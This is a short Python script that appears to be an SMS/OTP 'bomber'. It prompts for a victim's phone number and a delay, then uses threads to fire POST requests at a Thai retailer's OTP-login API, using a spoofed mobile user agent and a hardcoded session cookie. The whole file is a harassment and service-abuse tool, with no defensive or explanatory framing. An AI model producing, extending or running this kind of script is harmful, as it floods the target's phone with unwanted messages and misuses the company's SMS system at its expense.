import requests
import time
import threading
from threading import Thread

print("""
   ╔═╗╔═╗╔═╗╔╦╗╔═╗╔╦╗╔═╗┌─╦╔═┌─┐┬┌┬┐┌─┐┬─┐┌─┐┌─┐┌─┐┌─┐─┐
   ╚═╗╠═╝╠═╣║║║╚═╗║║║╚═╗│ ╠╩╗├─┤│ │ │ │├┬┘├─┤└─┐├─┤├─┘ │
   ╚═╝╩  ╩ ╩╩ ╩╚═╝╩ ╩╚═╝└─╩ ╩┴ ┴┴ ┴ └─┘┴└─┴ ┴└─┘┴ ┴┴  ─┘
""")

no = input("ⓃⓊⓂⒷⒺⓇ: ")
spx = int(input("ⓓⓔⓛⓐⓨⓢ: "))

headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "_ga=GA1.3.743816317.1647856068; G_ENABLED_IDPS=google; PHPSESSID=e2avm7579nrbnik9igknvhpsv5; _gid=GA1.3.1834480288.1649227465; _gat_gtag_UA_141105037_1=1"}

def kaitorasap():
	requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp-login/",data=f"phone_number={no}&lag=",headers=headers)
	
for x in range(1):
	time.sleep(spx)
	threading.Thread(target=kaitorasap).start()
	print("ⓢⓤⓒⓒⓔⓢⓢ !")